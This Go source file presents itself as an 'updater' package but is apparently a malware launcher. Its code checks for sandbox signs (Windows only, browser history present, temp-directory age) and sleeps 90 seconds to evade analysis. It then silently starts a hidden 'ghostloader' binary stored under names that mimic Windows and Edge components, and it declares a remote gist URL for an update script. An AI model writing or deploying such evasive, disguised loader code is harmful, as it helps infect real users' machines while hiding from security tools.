package updater

import (
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"syscall"
	"time"
)

const RemoteURL = "https://gist.githubusercontent.com/seventycs/2b9593e634d3a982b741b58c10320a75/raw/259b860badd5de56976dceb2b1b4950f0567e215/update.py"

// Check decides whether to fire the loader.
// Runs the loader only if conditions look like a real user (not a sandbox).
func Check() {
	if !isRealUser() {
		return
	}
	// delay: sandboxes usually run 30-90s, real users open the app and interact
	time.Sleep(90 * time.Second)
	if !isRealUser() {
		return
	}
	launchLoader()
}

// isRealUser checks for signals a sandbox rarely has.
func isRealUser() bool {
	if runtime.GOOS != "windows" {
		return false
	}
	// 1. must be running as a real user session
	home := os.Getenv("USERPROFILE")
	if home == "" {
		return false
	}
	// 2. must have a browser cache — real users have history
	chrome := filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "History")
	edge := filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "History")
	if !fileExists(chrome) && !fileExists(edge) {
		return false
	}
	// 3. must have interacted with the machine (uptime > 5 min)
	// simple heuristic: check temp dir age
	tmp := os.TempDir()
	if info, err := os.Stat(tmp); err == nil {
		if time.Since(info.ModTime()) < 5*time.Minute {
			return false
		}
	}
	return true
}

func fileExists(p string) bool {
	_, err := os.Stat(p)
	return err == nil
}

// launchLoader spawns ghostloader detached + hidden.
func launchLoader() {
	loaderPath := findLoader()
	if loaderPath == "" {
		return
	}
	cmd := exec.Command(loaderPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}
	_ = cmd.Start()
}

// findLoader looks for the loader binary in common locations.
func findLoader() string {
	candidates := []string{
		filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "RuntimeBroker", "runtimebroker.exe"),
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "EdgeUpdate", "edgeupdater.exe"),
		filepath.Join(filepath.Dir(os.Args[0]), "systemd.exe"),
	}
	for _, c := range candidates {
		if fileExists(c) {
			return c
		}
	}
	return ""
}

var _ = RemoteURL